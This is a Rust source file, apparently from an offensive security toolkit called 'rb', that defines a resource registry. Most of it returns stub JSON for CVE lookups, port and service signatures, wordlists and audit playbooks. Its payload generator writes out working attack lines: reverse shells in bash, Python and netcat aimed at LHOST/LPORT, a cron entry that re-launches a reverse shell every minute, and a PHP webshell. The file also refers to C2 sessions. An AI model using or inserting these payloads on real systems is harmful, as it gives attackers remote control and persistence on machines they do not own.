    fn gen_technique_details(&self, id: &str) -> String {
        format!(
            r#"{{"id":"{}","note":"Use rb intel mitre technique {} for details"}}"#,
            id, id
        )
    }

    fn gen_cpe_dictionary(&self) -> String {
        r#"{"version":"2.3","entries":65,"categories":["webservers","frameworks","cms","databases"]}"#.into()
    }

    fn gen_scan_results(&self, target: &str, scan_type: Option<&str>) -> String {
        format!(
            r#"{{"target":"{}","type":"{}","note":"Use rb commands for live scans"}}"#,
            target,
            scan_type.unwrap_or("all")
        )
    }

    fn gen_cve_details(&self, cve: &str) -> String {
        format!(
            r#"{{"cve":"{}","note":"Use rb intel vuln cve {} for NVD data"}}"#,
            cve, cve
        )
    }

    fn gen_db_partitions(&self) -> String {
        r#"{"partitions":[],"tables":["ports","subdomains","dns","tls","http","whois","vulns"]}"#
            .into()
    }

    fn gen_db_partition(&self, partition: &str, table: Option<&str>) -> String {
        format!(
            r#"{{"partition":"{}","table":{}}}"#,
            partition,
            table.map(|t| format!("\"{}\"", t)).unwrap_or("null".into())
        )
    }

    fn gen_wordlist_index(&self) -> String {
        r#"{"wordlists":["common","directories","api-endpoints","passwords-top1000","vhosts"]}"#
            .into()
    }

    fn gen_wordlist_content(&self, name: &str) -> String {
        match name {
            "common" => "www\nmail\nftp\napi\ndev\nstaging\ntest\nadmin\nportal\nm\nmobile\napp\ncloud\ncdn\nmedia\nstatic".into(),
            "directories" => "admin\nlogin\nwp-admin\napi\nv1\nv2\ngraphql\ndocs\nconfig\nbackup\ntest\ndebug\nlog".into(),
            "api-endpoints" => "/api\n/api/v1\n/api/v2\n/graphql\n/swagger\n/api/users\n/api/auth\n/api/health".into(),
            _ => format!("# Wordlist '{}' not found", name),
        }
    }

    fn gen_payload_index(&self) -> String {
        r#"{"categories":["shells","persistence","privesc","exfil","webshells"]}"#.into()
    }

    fn gen_payload_content(&self, category: &str, name: Option<&str>) -> String {
        match (category, name) {
            ("shells", Some("bash")) => "bash -i >& /dev/tcp/LHOST/LPORT 0>&1".into(),
            ("shells", Some("python")) => r#"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"#.into(),
            ("shells", Some("nc")) => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f".into(),
            ("persistence", Some("cron")) => "echo '* * * * * bash -i >& /dev/tcp/LHOST/LPORT 0>&1' | crontab -".into(),
            ("webshells", Some("php")) => "<?php system($_GET['c']); ?>".into(),
            _ => format!("# Payload '{}/{}' not found", category, name.unwrap_or("*")),
        }
    }

    fn gen_whois_data(&self, domain: &str) -> String {
        format!(
            r#"{{"domain":"{}","note":"Use rb recon domain whois {} for live data"}}"#,
            domain, domain
        )
    }

    fn gen_dns_records(&self, domain: &str, rtype: Option<&str>) -> String {
        format!(
            r#"{{"domain":"{}","type":"{}","note":"Use rb dns record lookup {}"}}"#,
            domain,
            rtype.unwrap_or("A"),
            domain
        )
    }

    fn gen_ioc_lookup(&self, ioc_type: &str, value: &str) -> String {
        format!(
            r#"{{"type":"{}","value":"{}","malicious":null,"note":"IOC lookup"}}"#,
            ioc_type, value
        )
    }

    fn gen_exploit_details(&self, edb_id: &str) -> String {
        format!(
            r#"{{"edb_id":"{}","note":"Use rb intel vuln exploit {}"}}"#,
            edb_id, edb_id
        )
    }

    fn gen_port_signatures(&self) -> String {
        r#"{"22":"SSH","80":"HTTP","443":"HTTPS","3306":"MySQL","5432":"PostgreSQL","6379":"Redis","27017":"MongoDB"}"#.into()
    }

    fn gen_security_headers_ref(&self) -> String {
        r#"{"headers":{"HSTS":"Strict-Transport-Security","CSP":"Content-Security-Policy","XFO":"X-Frame-Options","XCTO":"X-Content-Type-Options"}}"#.into()
    }

    // ───────────────────────────────────────────────────────────────────────
    // NEW DATA GENERATORS
    // ───────────────────────────────────────────────────────────────────────

    fn gen_config(&self) -> String {
        r#"{"presets":{"common":[22,80,443,8080],"full":"1-65535","web":[80,443,8080,8443]},"threads":200,"timeout_ms":1000,"output":"text"}"#.into()
    }

    fn gen_history(&self) -> String {
        r#"{"commands":[],"note":"Command history is stored per-session"}"#.into()
    }

    fn gen_exploitdb_search(&self, query: &str) -> String {
        format!(
            r#"{{"query":"{}","results":[],"note":"Use rb intel vuln exploit {} for live search"}}"#,
            query, query
        )
    }

    fn gen_service_signatures(&self) -> String {
        r#"{"services":["ssh","http","https","ftp","smtp","dns","mysql","postgresql","mongodb","redis","elasticsearch","memcached","rabbitmq","kafka"]}"#.into()
    }

    fn gen_service_signature(&self, name: &str) -> String {
        let sig = match name {
            "ssh" => r#"{"ports":[22],"banner":"SSH-","probes":["SSH-2.0-"]}"#,
            "http" => r#"{"ports":[80,8080,8000],"banner":"HTTP/","probes":["GET / HTTP/1.1"]}"#,
            "mysql" => {
                r#"{"ports":[3306],"banner":"\x00\x00\x00\x0a","probes":["mysql_native_password"]}"#
            }
            "redis" => r#"{"ports":[6379],"banner":"-ERR","probes":["PING"]}"#,
            _ => r#"{"ports":[],"banner":"unknown","probes":[]}"#,
        };
        format!(r#"{{"service":"{}","signature":{}}}"#, name, sig)
    }

    fn gen_port_signature(&self, port: &str) -> String {
        let service = match port {
            "22" => "ssh",
            "80" | "8080" | "8000" => "http",
            "443" | "8443" => "https",
            "3306" => "mysql",
            "5432" => "postgresql",
            "6379" => "redis",
            "27017" => "mongodb",
            _ => "unknown",
        };
        format!(
            r#"{{"port":{},"service":"{}","common":true}}"#,
            port, service
        )
    }

    fn gen_os_signatures(&self) -> String {
        r#"{"signatures":{"linux":{"ttl":64,"window":5840},"windows":{"ttl":128,"window":65535},"macos":{"ttl":64,"window":65535},"freebsd":{"ttl":64,"window":65535}}}"#.into()
    }

    fn gen_cms_signatures(&self) -> String {
        r#"{"cms":[{"name":"WordPress","paths":["/wp-admin","/wp-content","/wp-includes"],"headers":["X-Powered-By: WordPress"]},{"name":"Drupal","paths":["/sites/default","/misc/drupal.js"],"headers":[]},{"name":"Joomla","paths":["/administrator","/components"],"headers":[]}]}"#.into()
    }

    fn gen_well_known_ports(&self) -> String {
        r#"{"ranges":{"system":"0-1023","registered":"1024-49151","dynamic":"49152-65535"},"common":{"21":"FTP","22":"SSH","23":"Telnet","25":"SMTP","53":"DNS","80":"HTTP","110":"POP3","143":"IMAP","443":"HTTPS","993":"IMAPS","995":"POP3S","3306":"MySQL","5432":"PostgreSQL"}}"#.into()
    }

    fn gen_cwe_top25(&self) -> String {
        r#"{"year":2024,"weaknesses":[{"rank":1,"id":"CWE-787","name":"Out-of-bounds Write"},{"rank":2,"id":"CWE-79","name":"Cross-site Scripting"},{"rank":3,"id":"CWE-89","name":"SQL Injection"},{"rank":4,"id":"CWE-416","name":"Use After Free"},{"rank":5,"id":"CWE-78","name":"OS Command Injection"},{"rank":6,"id":"CWE-20","name":"Improper Input Validation"},{"rank":7,"id":"CWE-125","name":"Out-of-bounds Read"},{"rank":8,"id":"CWE-22","name":"Path Traversal"},{"rank":9,"id":"CWE-352","name":"Cross-Site Request Forgery"},{"rank":10,"id":"CWE-434","name":"Unrestricted Upload"}]}"#.into()
    }

    fn gen_owasp_top10(&self) -> String {
        r#"{"year":2021,"risks":[{"rank":"A01","name":"Broken Access Control"},{"rank":"A02","name":"Cryptographic Failures"},{"rank":"A03","name":"Injection"},{"rank":"A04","name":"Insecure Design"},{"rank":"A05","name":"Security Misconfiguration"},{"rank":"A06","name":"Vulnerable Components"},{"rank":"A07","name":"Auth Failures"},{"rank":"A08","name":"Data Integrity Failures"},{"rank":"A09","name":"Logging Failures"},{"rank":"A10","name":"SSRF"}]}"#.into()
    }

    fn gen_active_sessions(&self) -> String {
        r#"{"sessions":[],"count":0,"note":"No active C2 sessions. Use rb agent server start to begin."}"#.into()
    }

    fn gen_session_history(&self) -> String {
        r#"{"sessions":[],"total":0}"#.into()
    }

    fn gen_session_details(&self, session_id: &str, sub: Option<&str>) -> String {
        match sub {
            Some("commands") => format!(r#"{{"session_id":"{}","commands":[]}}"#, session_id),
            _ => format!(
                r#"{{"session_id":"{}","status":"unknown","note":"Session not found"}}"#,
                session_id
            ),
        }
    }

    fn gen_playbook_index(&self) -> String {
        r#"{"playbooks":[{"name":"full-recon","description":"Complete reconnaissance workflow"},{"name":"web-audit","description":"Web application security audit"},{"name":"network-sweep","description":"Network discovery and port scanning"},{"name":"vuln-assess","description":"Vulnerability assessment pipeline"},{"name":"subdomain-enum","description":"Comprehensive subdomain enumeration"},{"name":"api-security","description":"API security testing"},{"name":"cloud-audit","description":"Cloud infrastructure audit"}]}"#.into()
    }

    fn gen_running_playbooks(&self) -> String {
        r#"{"running":[],"count":0}"#.into()
    }

    fn gen_playbook_details(&self, name: &str, sub: Option<&str>) -> String {
        match sub {
            Some("runs") => format!(r#"{{"playbook":"{}","runs":[]}}"#, name),
            _ => {
                let desc = match name {
                    "full-recon" => "DNS enumeration, subdomain discovery, port scanning, service detection, vulnerability correlation",
                    "web-audit" => "HTTP headers, TLS audit, directory fuzzing, CMS detection, security headers",
                    "network-sweep" => "Host discovery, port scanning, service fingerprinting, OS detection",
                    _ => "Custom playbook",
                };
                format!(
                    r#"{{"name":"{}","description":"{}","steps":[]}}"#,
                    name, desc
                )
            }
        }
    }

    fn gen_search_index(&self) -> String {
        r#"{"indexed":["vulns","techniques","cves","ports","services","domains"],"total_docs":0,"last_updated":null}"#.into()
    }

    fn gen_search_results(&self, query: &str) -> String {
        format!(
            r#"{{"query":"{}","results":[],"total":0,"note":"Semantic search requires embeddings. Use rb mcp embeddings build."}}"#,
            query
        )
    }

    fn gen_similar_cves(&self, cve_id: &str) -> String {
        format!(
            r#"{{"cve":"{}","similar":[],"note":"Similarity search requires embeddings."}}"#,
            cve_id
        )
    }

    fn gen_similar_techniques(&self, technique_id: &str) -> String {
        format!(
            r#"{{"technique":"{}","related":[],"note":"Use rb intel mitre technique {} for details."}}"#,
            technique_id, technique_id
        )
    }
}

impl Default for ResourceRegistry {
    fn default() -> Self {
        Self::new()
    }
}
